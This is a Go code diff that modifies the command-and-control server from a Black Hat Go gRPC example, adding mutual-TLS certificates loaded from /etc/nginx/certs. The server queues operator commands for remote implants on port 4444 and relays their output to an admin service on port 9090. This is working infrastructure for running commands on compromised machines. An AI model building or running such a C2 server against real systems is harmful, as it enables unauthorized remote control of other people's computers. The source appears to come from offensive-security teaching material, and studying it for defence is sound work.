@@ -1,24 +1,24 @@
 package main
 
 import (
-	"context"
-	"crypto/tls"
-	"crypto/x509"
-	"fmt"
-	"io/ioutil"
-	"log"
-	"os/exec"
-	"strings"
-	"time"
+        "context"
+        "crypto/tls"
+        "crypto/x509"
+        "fmt"
+        "io/ioutil"
+        "log"
+        "errors"
+        "net"
 
-	"github.com/blackhat-go/bhg/ch-14/grpcapi"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials"
+        "github.com/blackhat-go/bhg/ch-14/grpcapi"
+        "google.golang.org/grpc"
+        "google.golang.org/grpc/credentials"
+
 )
 
 func loadTLSCredentials() (credentials.TransportCredentials, error) {
     // Load certificate of the CA who signed client's certificate
-    pemClientCA, err := ioutil.ReadFile("cert/ca-cert.pem")
+    pemClientCA, err := ioutil.ReadFile("/etc/nginx/certs/ca.crt")
     if err != nil {
         return nil, err
     }
@@ -29,7 +29,7 @@ func loadTLSCredentials() (credentials.TransportCredentials, error) {
     }
 
     // Load server's certificate and private key
-    serverCert, err := tls.LoadX509KeyPair("cert/server-cert.pem", "cert/server-key.pem")
+    serverCert, err := tls.LoadX509KeyPair("/etc/nginx/certs/client.crt", "/etc/nginx/certs/client.key")
     if err != nil {
         return nil, err
     }
@@ -44,82 +44,82 @@ func loadTLSCredentials() (credentials.TransportCredentials, error) {
     return credentials.NewTLS(config), nil
 }
 
-
 type implantServer struct {
-	work, output chan *grpcapi.Command
+        work, output chan *grpcapi.Command
 }
 
 type adminServer struct {
-	work, output chan *grpcapi.Command
+        work, output chan *grpcapi.Command
 }
 
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
-	s := new(implantServer)
-	s.work = work
-	s.output = output
-	return s
+        s := new(implantServer)
+        s.work = work
+        s.output = output
+        return s
 }
 
 func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
-	s := new(adminServer)
-	s.work = work
-	s.output = output
-	return s
+        s := new(adminServer)
+        s.work = work
+        s.output = output
+        return s
 }
 
 func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
-	var cmd = new(grpcapi.Command)
-	select {
-	case cmd, ok := <-s.work:
-		if ok {
-			return cmd, nil
-		}
-		return cmd, errors.New("channel closed")
-	default:
-		// No work
-		return cmd, nil
-	}
+        var cmd = new(grpcapi.Command)
+        select {
+        case cmd, ok := <-s.work:
+                if ok {
+                        return cmd, nil
+                }
+                return cmd, errors.New("channel closed")
+        default:
+                // No work
+                return cmd, nil
+        }
 }
 
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
-	s.output <- result
-	return &grpcapi.Empty{}, nil
+        s.output <- result
+        return &grpcapi.Empty{}, nil
 }
 
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
-	var res *grpcapi.Command
-	go func() {
-		s.work <- cmd
-	}()
-	res = <-s.output
-	return res, nil
+        var res *grpcapi.Command
+        go func() {
+                s.work <- cmd
+        }()
+        res = <-s.output
+        return res, nil
 }
 
 func main() {
-	var (
-		implantListener, adminListener net.Listener
-		err                            error
-		opts                           []grpc.ServerOption
-		work, output                   chan *grpcapi.Command
-	)
-	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
-	implant := NewImplantServer(work, output)
-	admin := NewAdminServer(work, output)
-	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
-		log.Fatal(err)
-	}
-	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
-		log.Fatal(err)
-	}
-	grpcAdminServer, grpcImplantServer := grpc.NewServer(grpc.Creds(tlsCredentials),
-        grpc.UnaryInterceptor(interceptor.Unary()),
-        grpc.StreamInterceptor(interceptor.Stream())), grpc.NewServer(grpc.Creds(tlsCredentials),
-        grpc.UnaryInterceptor(interceptor.Unary()),
-        grpc.StreamInterceptor(interceptor.Stream()))
-	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
-	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
-	go func() {
-		grpcImplantServer.Serve(implantListener)
-	}()
-	grpcAdminServer.Serve(adminListener)
+        var (
+                implantListener, adminListener net.Listener
+                err                            error
+                //opts                           []grpc.ServerOption
+                work, output                   chan *grpcapi.Command
+        )
+        tlsCredentials, err := loadTLSCredentials()
+        if err != nil {
+            log.Fatal("cannot load TLS credentials: ", err)
+        }
+
+        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+        implant := NewImplantServer(work, output)
+        admin := NewAdminServer(work, output)
+        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
+                log.Fatal(err)
+        }
+        if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
+                log.Fatal(err)
+        }
+        grpcAdminServer, grpcImplantServer := grpc.NewServer(grpc.Creds(tlsCredentials)),grpc.NewServer(grpc.Creds(tlsCredentials))
+        grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+        grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+        go func() {
+                grpcImplantServer.Serve(implantListener)
+        }()
+        grpcAdminServer.Serve(adminListener)
 }
